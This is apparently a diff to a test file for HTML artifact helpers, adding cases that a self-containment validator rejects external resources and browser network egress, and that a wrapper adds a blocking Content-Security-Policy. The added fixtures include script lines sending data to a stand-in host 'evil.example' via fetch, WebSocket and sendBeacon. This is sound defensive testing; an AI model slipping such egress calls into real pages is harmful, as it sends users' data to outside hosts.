@@ -69,7 +69,9 @@ describe('artifact html helpers', () => {
     it.each([
       '<script src="https://cdn.example.com/x.js"></script>',
       '<link rel="stylesheet" href="https://fonts.example.com/x.css">',
+      '<img srcset="https://cdn.example.com/a.png 1x">',
       '<img src="//cdn.example.com/a.png">',
+      '<video poster="https://cdn.example.com/poster.png"></video>',
       '<script src="http://evil/x.js"></script>',
     ])('rejects external resource %s', (frag) => {
       expect(validateSelfContained(frag)).toMatch(/self-contained/i);
@@ -77,9 +79,19 @@ describe('artifact html helpers', () => {
 
     it.each([
       '<style>@import url(https://fonts.example.com/f.css);</style>',
+      '<style>@import "https://fonts.example.com/f.css";</style>',
       '<style>body{background:url("https://cdn/x.png")}</style>',
       '<style>@font-face{src:url(//cdn/f.woff2)}</style>',
     ])('rejects external CSS %s', (frag) => {
+      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
+    });
+
+    it.each([
+      '<script>fetch("https://evil.example/upload")</script>',
+      '<script>new WebSocket("wss://evil.example/ws")</script>',
+      '<script>navigator.sendBeacon("https://evil.example", "x")</script>',
+      '<meta http-equiv="refresh" content="0; url=https://evil.example">',
+    ])('rejects browser network egress %s', (frag) => {
       expect(validateSelfContained(frag)).toMatch(/self-contained/i);
     });
   });
@@ -91,6 +103,13 @@ describe('artifact html helpers', () => {
       expect(html).toContain('<title>My Page</title>');
       expect(html).toContain('<h1>Hi</h1>');
       expect(html).toContain('viewport');
+    });
+
+    it('adds a CSP that blocks network egress', () => {
+      const html = wrapArtifactHtml('<p>x</p>', 'My Page');
+      expect(html).toContain('Content-Security-Policy');
+      expect(html).toContain("connect-src 'none'");
+      expect(html).toContain("default-src 'none'");
     });
 
     it('escapes the title', () => {
